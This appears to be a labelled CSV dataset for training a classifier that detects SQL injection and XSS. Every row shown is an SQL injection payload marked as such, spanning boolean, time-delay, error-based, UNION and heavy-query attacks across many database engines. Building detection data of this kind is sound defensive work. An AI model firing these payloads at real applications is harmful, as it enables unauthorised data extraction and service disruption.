Sentence,SQLInjection,XSS,Normal
1'  )  )   as plbt where 4368 = 4368 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1,0,0
"1 )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ",1,0,0
"1"" )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( ""dppw"" like ""dppw",1,0,0
1'|| ( select 'zyvk' from dual where 2072 = 2072,1,0,0
-5918' )  as olzc where 5992 = 5992 or 4390 = 9085,1,0,0
"-9795 )  as wrgs where 5427 = 5427 union all select 5427,5427,5427,5427,5427,5427--",1,0,0
1' where 6913 = 6913 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1,0,0
"-5243"" where 2105 = 2105 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",1,0,0
-6637'  )  )   order by 1#,1,0,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and ""ulfr"" like ""ulfr",1,0,0
"1'+ ( select 'rryx' where 1228 = 1228 union all select null,null,null,null,null,null,null,null,null#",1,0,0
"1'  )  )   or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,0,0
1 )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( 3945 = 3945,1,0,0
"1 )  as biup where 1414 = 1414 union all select null,null,null,null,null,null,null,null#",1,0,0
"-5827"" )  as lskq where 7683 = 7683 union all select 7683,7683,7683,7683,7683#",1,0,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual ) ||'",1,0,0
"-3697'  )  )   )  union all select 5180,5180,5180,5180,5180,5180,5180--",1,0,0
"1"" )  where 7010 = 7010 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,0,0
1'  )  )   )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( 'smrw' like 'smrw,1,0,0
1' and 5967 = 4184#,1,0,0
1'|| ( select 'cclo' from dual where 6823 = 6823 and 9198 = 9198--,1,0,0
1' where 7191 = 7191 rlike sleep ( 5 ) --,1,0,0
"1'  )  )   and make_set ( 8245 = 9872,9872 )  and   (  (  'kzgt' = 'kzgt",1,0,0
"1' and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and 'wjwn' = 'wjwn",1,0,0
"1'  )  )   or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  'acly' like 'acly",1,0,0
"1"" )  where 1330 = 1330 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --",1,0,0
"1 )  where 7199 = 7199 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
"1%""  )  )   and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  ""%"" = """,1,0,0
"-9514  )  )   as xdkw where 4975 = 4975 union all select 4975,4975,4975,4975#",1,0,0
"1 union all select null,null#",1,0,0
"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) -- kfqs",1,0,0
"1'|| ( select 'wyng' from dual where 2157 = 2157 union all select null,null--",1,0,0
1' )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( 'vhqm' = 'vhqm,1,0,0
"1'+ ( select 'zohk' where 5502 = 5502 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,0,0
-6865 )  or  ( 8459 = 8459 ) *4906 and  ( 6107 = 6107,1,0,0
"1%""  )  )   and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (  ""%"" = """,1,0,0
"1'+ ( select 'qrml' where 3791 = 3791 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) +'",1,0,0
1'  )  )   as eymg where 7000 = 7000,1,0,0
"1%'  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( '%' = '",1,0,0
"1%""  )  )   )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,0,0
"-1065  )  )   union all select 7437,7437,7437,7437,7437,7437,7437,7437--",1,0,0
-1603'  )  )   or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  'abmo' = 'abmo,1,0,0
"1', ( select  ( case when  ( 2106 = 2106 )  then  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  else 2106* ( select 2106 from master..sysdatabases )  end  )  )  ",1,0,0
"1%"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,0,0
"1 where 7051 = 7051 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,0,0
"1' )  where 6672 = 6672 union all select null,null,null,null,null,null,null,null,null,null--",1,0,0
-3899' )  where 8152 = 8152 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,1,0,0
"1"" )  and  ( 3020 = 3020 ) *6703 and  ( ""hkjf"" = ""hkjf",1,0,0
"1%""  )  )   )  and 7533 = 7533 and   (  (   ( ""%"" = """,1,0,0
"1%"" )  and  ( 6016 = 4763 ) *4763 and  ( ""%"" = """,1,0,0
"1""  )  )   )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,0,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (  ""%"" = """,1,0,0
"-3391' union all select 2024,2024--",1,0,0
"1%' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and '%' = '",1,0,0
"-3829%"" )  union all select 2218,2218,2218,2218,2218,2218,2218--",1,0,0
"-8629 where 8049 = 8049 union all select 8049,8049,8049,8049,8049,8049,8049#",1,0,0
"-3279"" union all select 8568,8568,8568,8568--",1,0,0
"1"" or elt ( 6272 = 6272,sleep ( 5  )  )  ",1,0,0
"1%'  )  )   )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,0,0
"1%'  )  )   and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,0,0
1' )  rlike sleep ( 5 ) #,1,0,0
-3598 )  union all select 2264#,1,0,0
select  ( case when  ( 9455 = 6007 )  then 9455 else 9455* ( select 9455 from mysql.db )  end ) #,1,0,0
"-8982' in boolean mode )  union all select 5367,5367,5367,5367,5367,5367#",1,0,0
1' )  and 9198 = 9198--,1,0,0
"1"" )  where 6897 = 6897",1,0,0
"1"" where 7739 = 7739 and sleep ( 5 ) --",1,0,0
"1' where 5702 = 5702 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,0,0
"1""  )  )   and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (  ""nbfe"" = ""nbfe",1,0,0
"1""  )  )   as osuh where 8809 = 8809",1,0,0
"1'|| ( select 'ftey' where 1363 = 1363 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  ||'",1,0,0
"1' where 7104 = 7104 union all select null,null,null,null,null,null,null#",1,0,0
1%' order by 1#,1,0,0
"1""  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  ""nwzu"" like ""nwzu",1,0,0
select  ( case when  ( 6961 = 7460 )  then 1 else 6961* ( select 6961 from master..sysdatabases )  end ) --,1,0,0
select  ( case when  ( 3676 = 8635 )  then 3676 else 1/ ( select 0 )  end ) --,1,0,0
"1%"" )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1,0,0
-5137 )  or 9323 = 9323#,1,0,0
"-1184""  )  )   )  union all select 1482--",1,0,0
"-6158"" )  union all select 3084,3084,3084,3084,3084,3084#",1,0,0
"1""  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( ""hkjm"" like ""hkjm",1,0,0
1 )  as gbtj where 8175 = 8175,1,0,0
"1'  )  )   and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (  'mwyu' = 'mwyu",1,0,0
1 )  as lisg where 5490 = 5490,1,0,0
"1  )  )   procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1,0,0
"1'  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  'dpdz' like 'dpdz",1,0,0
' or '1'  =  '1,1,0,0
"1 where 3902 = 3902 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"-9859""  )  )   )  union all select 6595,6595,6595,6595,6595,6595,6595#",1,0,0
"1"" )  as xylo where 2112 = 2112 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1,0,0
"1' where 8749 = 8749 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
"1'|| ( select 'oyyu' where 6765 = 6765 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666  )  )  ||'",1,0,0
-3100' )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'etuj' like 'etuj,1,0,0
"-2319 union all select 5068,5068,5068#",1,0,0
"-6095"" )  as hygc where 8142 = 8142 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1,0,0
"-9656"" union all select 8735,8735--",1,0,0
1 )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) ,1,0,0
"1%""  )  )   and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
"1""  )  )   as rcse where 4559 = 4559 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --",1,0,0
"1""  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  ""oxvw"" = ""oxvw",1,0,0
-9840'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'dzlp' = 'dzlp,1,0,0
"1'|| ( select 'svbf' where 7017 = 7017 or elt ( 6272 = 6272,sleep ( 5  )  )   ) ||'",1,0,0
-4892%'  )  )   or 2251 = 9881--,1,0,0
"1"" )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""pfea"" = ""pfea",1,0,0
"-5859 )  as ernq where 8394 = 8394 union all select 8394,8394,8394--",1,0,0
"-4076'  )  )   union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",1,0,0
-6233' )  where 9820 = 9820 or 3038 = 3038,1,0,0
"-8950""  )  )   as uahs where 2113 = 2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",1,0,0
"-8209 )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1,0,0
-9826 where 4103 = 4103 order by 1#,1,0,0
1  )  )   as muyz where 6105 = 6105,1,0,0
1' and 1541 = 6868#,1,0,0
1 )  where 1402 = 1402,1,0,0
1'|| ( select 'wadx' where 4287 = 4287 or sleep ( 5 ) #,1,0,0
"-3234%""  )  )   or elt ( 1032 = 1032,3623 )  and   (  (  ""%"" = """,1,0,0
"1' union all select null,null,null--",1,0,0
1 where 9872 = 9872,1,0,0
"-7482%""  )  )   or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  ""%"" = """,1,0,0
"1' )  where 7587 = 7587 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
"-9295  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( 8752 = 8752",1,0,0
"1' )  as ibqr where 5372 = 5372 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,0,0
"-9135""  )  )   or 6872 = 6872 and   (  (  ""fllx"" = ""fllx",1,0,0
1%' and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and '%' = ',1,0,0
"1%' or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and '%' = '",1,0,0
"1, ( select  ( case when  ( 3888 = 3888 )  then  ( select count ( * )  from generate_series ( 1,5000000  )  )   else 1/ ( select 0 )  end  )  )  ",1,0,0
"-9881""  )  )   or 9850 = 8118#",1,0,0
"1 )  union all select null,null,null,null,null,null,null,null,null,null--",1,0,0
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1,0,0
select  ( case when  ( 5390 = 7419 )  then 5390 else 5390* ( select 5390 from mysql.db )  end ) #,1,0,0
-7111' or  ( 8459 = 8459 ) *4906,1,0,0
"1 union all select null,null,null,null,null,null,null#",1,0,0
-7859 )  as ipdg where 4413 = 4413 or 9323 = 9323#,1,0,0
"-2323"" )  as zgsn where 9274 = 9274 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --",1,0,0
1 )  where 5774 = 5774,1,0,0
"1""  )  )   as fhlg where 1004 = 1004 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --",1,0,0
"-8893%'  )  )   or elt ( 1032 = 1032,3623 )  and   (  (  '%' = '",1,0,0
"-8791""  )  )   )  or make_set ( 6681 = 6620,6620 )  and   (  (   ( ""pvdk"" = ""pvdk",1,0,0
"-3081""  )  )   )  or 3736 = 1899",1,0,0
-4082  )  )   or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  7874 = 7874,1,0,0
select  ( case when  ( 6615 = 3564 )  then 1 else 6615* ( select 6615 from master..sysdatabases )  end ) --,1,0,0
-7648' )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) ,1,0,0
select  ( case when  ( 9540 = 5786 )  then 9540 else 9540* ( select 9540 from information_schema.character_sets )  end ) #,1,0,0
select case when 7426 = 6635 then 1 else null end--,1,0,0
"1%'  )  )   )  union all select null,null,null,null#",1,0,0
"iif ( 3204 = 8489,3204,1/0 ) ",1,0,0
"1%' )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and  ( '%' = '",1,0,0
"1""  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,0,0
"1""  )  )   )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (   ( ""wjhj"" = ""wjhj",1,0,0
"1"" where 6800 = 6800 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1,0,0
"-3933'  )  )   )  union all select 6198,6198,6198,6198,6198#",1,0,0
"1%""  )  )   and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  ""%"" = """,1,0,0
"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and ""egzm"" = ""egzm",1,0,0
"-3361  )  )   union all select 2827,2827,2827,2827#",1,0,0
1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and 'iuao' = 'iuao,1,0,0
"select count ( * )  from generate_series ( 1,5000000 ) #",1,0,0
" end and   (  (  ""%"" = """,1,0,0
"1""  )  )   as bbkl where 5686 = 5686",1,0,0
"1%"" )  and  ( 3020 = 3020 ) *6703 and  ( ""%"" = """,1,0,0
1'+ ( select 'cwta' where 6091 = 6091,1,0,0
"1%""  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  ""%"" = """,1,0,0
"-6333""  )  )   )  union all select 9851,9851,9851,9851,9851,9851--",1,0,0
"1""  )  )   and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (  ""xccy"" = ""xccy",1,0,0
"1"" )  as xioc where 7260 = 7260 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,0,0
"-2298%' or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1,0,0
"-1808%""  )  )   or 4595 = 3545 and   (  (  ""%"" = """,1,0,0
1 )  as bhdj where 4472 = 4472,1,0,0
"1%"" union all select null,null,null,null,null#",1,0,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",1,0,0
"-7635"" union all select 1284,1284,1284,1284,1284,1284#",1,0,0
1'  )  )   as pgif where 6346 = 6346,1,0,0
"1"" )  as yekp where 3049 = 3049 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,0,0
"1""  )  )   as mvxa where 3024 = 3024",1,0,0
"1"" )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and  ( ""cneo"" like ""cneo",1,0,0
"1%"" )  rlike sleep ( 5 )  and  ( ""%"" = """,1,0,0
"1' )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1,0,0
"1' )  as knxr where 5662 = 5662 union all select null,null,null,null,null,null,null,null#",1,0,0
-6045 or 8919 = 2827--,1,0,0
"1%"" or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""%"" = """,1,0,0
"1""  )  )   as khqq where 3637 = 3637 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
"1' )  as xvcr where 6456 = 6456 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  --",1,0,0
"-3349  )  )   )  union all select 6553,6553#",1,0,0
"-3475"" or elt ( 5532 = 4242,4242 ) ",1,0,0
select  ( case when  ( 2774 = 5503 )  then 2774 else 2774* ( select 2774 from information_schema.character_sets )  end ) #,1,0,0
"1'  )  )   and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
"1  )  )   as ambt where 5198 = 5198 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,0,0
-7505'  )  )   as lqvw where 8565 = 8565 or 6872 = 6872--,1,0,0
" end and  ( ""xksk"" = ""xksk",1,0,0
"-3513%"" union all select 8473,8473#",1,0,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and  ( '%' = '",1,0,0
"1' )  and elt ( 3528 = 3566,3566 ) ",1,0,0
1 )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ,1,0,0
"1'  )  )   )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,0,0
"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  # igen",1,0,0
"1'  )  )   )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'abcf' like 'abcf",1,0,0
"1' in boolean mode )  union all select null,null,null,null,null,null,null,null,null#",1,0,0
select  ( case when  ( 5740 = 7636 )  then 5740 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,0,0
"-9286""  )  )   as mfxl where 9348 = 9348 union all select 9348#",1,0,0
"1%""  )  )   union all select null,null,null,null,null,null#",1,0,0
